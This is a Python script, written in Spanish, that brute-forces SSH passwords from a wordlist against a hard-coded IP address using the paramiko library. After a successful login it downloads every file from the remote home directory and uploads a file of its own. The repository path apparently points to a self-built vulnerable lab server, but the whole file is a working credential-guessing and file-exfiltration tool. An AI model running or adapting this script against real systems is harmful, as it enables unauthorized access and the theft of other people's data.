import paramiko

nombre_dict = "dict.txt"
ruta_local = "/home/juanjo/Documents/GitHub/azure-vuln-server/"
host = "74.179.81.132"
#usuario = "labssh"

def cargar_dict(ruta_dict):
    claves = []
    try:
        with open(ruta_dict, "r") as archivo:
            for linea in archivo:
                claves.append(linea.strip())
            return claves
    except FileNotFoundError:
        print(f"El archivo '{ruta_dict}' no fue encontrado.")
        
        
def fuerza_bruta_ssh(host, lista_claves, ruta_local):
    if lista_claves == None:
        print("No se ha cargado el dicciontario")
        return
    
    cliente = paramiko.SSHClient()
    cliente.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    for clave in lista_claves:
        try:
            print(f"Probando contraseña: {clave}")
            cliente.connect(host, port=22, username="labssh", password=str(clave), look_for_keys=False, allow_agent=False)
            print("Autenticación completada")
            stdin, stdout, stderr = cliente.exec_command("ls")
            if stdout.read().decode():
                transferir_archivos(cliente, ruta_local)
            break

        except paramiko.AuthenticationException:
            print(f"Intento de autenticación fallido.\n")
        except Exception as e:
            print(f"Error: {e}")
            break

    cliente.close()


def transferir_archivos(conexion_ssh, ruta_local):
    sftp = conexion_ssh.open_sftp()
    lista_archivos = sftp.listdir()

    if lista_archivos:
        print("Archivos encontrados... Descagando...")
        for archivo in lista_archivos:
            try:
                sftp.get(archivo, ruta_local+archivo)
                print(f"Archivo: {archivo} descargado!!\n")
            except:
                print(f"Error al descargar el archivo: {archivo}")
    
    print("Subiendo archivo local.....")
    try:
        sftp.put(ruta_local+"dict.txt", "/home/labssh/dict.txt")
        print("Archivo subido con exito\n")
    except:
        print(f"Error al subir el archivo local")



if __name__ == "__main__":
    lista_claves = cargar_dict(ruta_local+nombre_dict)
    fuerza_bruta_ssh(host, lista_claves, ruta_local)
